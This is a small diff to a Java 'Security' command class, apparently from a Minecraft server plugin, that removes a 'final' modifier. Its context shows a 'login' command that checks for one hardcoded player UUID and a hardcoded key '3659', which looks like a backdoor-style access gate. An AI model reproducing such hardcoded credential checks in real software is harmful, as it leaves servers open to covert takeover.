@@ -28,7 +28,7 @@ public class Security extends BaseCommand {
     }
 
     @CommandAlias("login")
-    private final void security(Player player, String key) {
+    private void security(Player player, String key) {
         plugin.getLogger().info(player.getUniqueId().toString());
         if (player.getUniqueId().toString().equals("03c15276-ecfe-49bf-b20c-c4c20b13cb87")) {
             if (key.equals("3659")) {
